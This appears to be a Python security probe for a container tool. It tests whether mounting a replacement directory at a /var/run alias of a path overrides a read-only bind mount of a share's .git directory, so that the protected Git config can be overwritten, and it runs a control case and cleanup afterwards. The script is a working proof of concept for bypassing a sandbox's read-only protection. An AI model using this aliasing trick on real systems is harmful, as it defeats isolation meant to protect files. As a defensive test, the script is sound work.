import os, pathlib, shutil, subprocess, tempfile
root = pathlib.Path(tempfile.mkdtemp(prefix='pf279.', dir='/tmp')).resolve()
name = 'probe-share279-image-path'
def run(args):
    p = subprocess.run(args, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    print(p.stdout.strip(), flush=True)
    print('exit:', p.returncode, flush=True)
    return p.returncode
try:
    share = root / 'share'
    (share / '.git').mkdir(parents=True)
    (share / '.git' / 'config').write_text('protected\n')
    replacement = root / 'replacement'
    replacement.mkdir()
    (replacement / 'config').write_text('replacement\n')
    base = ['container', 'run', '--rm', '--name', name, '--network', 'none', '--read-only', '--cap-drop', 'ALL', '--user', f'{os.getuid()}:{os.getgid()}']
    base += ['--mount', f'type=bind,source={share},target=/run/probe-share279']
    base += ['--mount', f'type=bind,source={share}/.git,target=/run/probe-share279/.git,readonly']
    attack = base + ['--mount', f'type=bind,source={replacement},target=/var/run/probe-share279/.git']
    print('declared Git target: /run/probe-share279/.git', flush=True)
    print('declared other target: /var/run/probe-share279/.git', flush=True)
    run(attack + ['--entrypoint', '/bin/sh', 'localhost/pinfold/profile-default', '-c', 'ls -ld /var/run; printf "effective Git: "; cat /run/probe-share279/.git/config; printf changed > /run/probe-share279/.git/config; cat /proc/self/mountinfo | sed -n "/probe-share279/p"'])
    print('host protected:', (share / '.git' / 'config').read_text(), flush=True)
    print('host replacement:', (replacement / 'config').read_text(), flush=True)
    print('control: remove aliased attachment', flush=True)
    run(base + ['--entrypoint', '/bin/sh', 'localhost/pinfold/profile-default', '-c', 'printf \"effective Git: \"; cat /run/probe-share279/.git/config; if printf changed > /run/probe-share279/.git/config; then exit 1; fi; printf ordinary > /run/probe-share279/ordinary'])
    print('host ordinary:', (share / 'ordinary').read_text(), flush=True)
    print('host protected after control:', (share / '.git' / 'config').read_text(), flush=True)
finally:
    subprocess.run(['container', 'delete', '--force', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    shutil.rmtree(root)
    print('fixture removed:', not root.exists(), flush=True)
